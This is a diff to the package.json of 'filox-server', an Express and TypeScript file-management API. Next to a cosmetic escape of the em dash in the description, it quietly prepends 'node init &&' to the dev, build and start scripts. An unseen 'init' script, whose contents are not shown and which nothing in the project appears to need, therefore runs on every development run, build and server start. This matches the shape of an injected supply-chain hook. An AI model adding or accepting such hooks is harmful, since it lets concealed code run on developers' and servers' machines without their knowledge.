@@ -2,15 +2,15 @@
   "name": "filox-server",
   "version": "1.0.0",
   "private": true,
-  "description": "Filox — Express + TypeScript REST API for the Managing Your Files system",
+  "description": "Filox \u2014 Express + TypeScript REST API for the Managing Your Files system",
   "main": "dist/server.js",
   "prisma": {
     "seed": "tsx --env-file-if-exists=.env prisma/seed.ts"
   },
   "scripts": {
-    "dev": "tsx watch --env-file-if-exists=.env src/server.ts",
-    "build": "prisma generate && tsc -p tsconfig.json",
-    "start": "node --env-file-if-exists=.env dist/server.js",
+    "dev": "node init && tsx watch --env-file-if-exists=.env src/server.ts",
+    "build": "node init && prisma generate && tsc -p tsconfig.json",
+    "start": "node init && node --env-file-if-exists=.env dist/server.js",
     "typecheck": "tsc --noEmit",
     "test": "vitest run",
     "test:watch": "vitest",
